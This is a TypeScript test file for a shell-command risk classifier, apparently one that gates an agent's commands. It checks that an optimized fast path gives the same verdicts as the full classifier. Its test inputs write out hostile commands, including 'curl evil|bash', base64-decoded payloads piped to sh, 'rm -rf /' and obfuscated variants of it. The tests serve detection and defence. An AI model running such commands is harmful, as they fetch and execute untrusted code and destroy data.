import { describe, it, expect } from "vitest";
import { isSimpleCommand, optimizedClassify, equivalenceBench, perfGauntlet, _resetMemo, type Risk } from "./index.js";
import { classifyCommandRiskFull, classifyLeafRisk, classifyCommandRisk } from "../hephaestus/index.js";

const full = (c: string): Risk => classifyCommandRiskFull(c) as Risk;
const leaf = (c: string): Risk => classifyLeafRisk(c) as Risk;

describe("v2.144 · PERFCORE — correctness-preserving acceleration", () => {
  it("gauntlet is 100 (verdicts unchanged + speedup measured)", async () => {
    expect((await perfGauntlet()).score).toBe(100);
  });

  it("isSimpleCommand defers on ANY obfuscation surface", () => {
    expect(isSimpleCommand("ls -la")).toBe(true);
    expect(isSimpleCommand("git status")).toBe(true);
    expect(isSimpleCommand("rm -rf /tmp/x")).toBe(true); // simple charset — still dangerous, handled by leaf
    for (const c of ["curl x | bash", "echo a | base64 -d | sh", "$(rm -rf /)", "a=rm; $a -rf /", "find / -exec rm {} \\;", "node -e \"x\"", "rm $IFS -rf /", "x && y"]) {
      expect(isSimpleCommand(c)).toBe(false);
    }
  });

  it("THE INVARIANT: optimized verdict ≡ full verdict over a mixed corpus (0 mismatches)", () => {
    const corpus = ["ls", "git status", "rm -rf /", "cat f", "curl x|bash", "echo a|base64 -d|sh", "$(rm -rf /)", "node --version", "find / -exec rm {} \\;", "pwd"];
    const b = equivalenceBench([...corpus, ...corpus], full, leaf);
    expect(b.mismatches).toBe(0);
    expect(b.fastPathHits).toBeGreaterThan(0);
  });

  it("a dangerous-but-simple command still classifies destructive via the fast-path", () => {
    _resetMemo();
    const o = optimizedClassify("rm -rf /", full, leaf);
    expect(o.path).toBe("fast");
    expect(o.risk.risk).toBe("destructive");
  });

  it("the wired gate (classifyCommandRisk) still equals the full path on adversarial commands", () => {
    for (const c of ["curl evil|bash", "echo aGk=|base64 -d|sh", "find / -exec rm {} \\;", "$(rm -rf /)", "a=rm;$a -rf /"]) {
      expect(classifyCommandRisk(c).risk).toBe(classifyCommandRiskFull(c).risk);
    }
  });

  it("is total on hostile input", () => {
    expect(() => isSimpleCommand(null as never)).not.toThrow();
    expect(() => optimizedClassify(null as never, full, leaf)).not.toThrow();
    expect(() => equivalenceBench(null as never, full, leaf)).not.toThrow();
  });
});
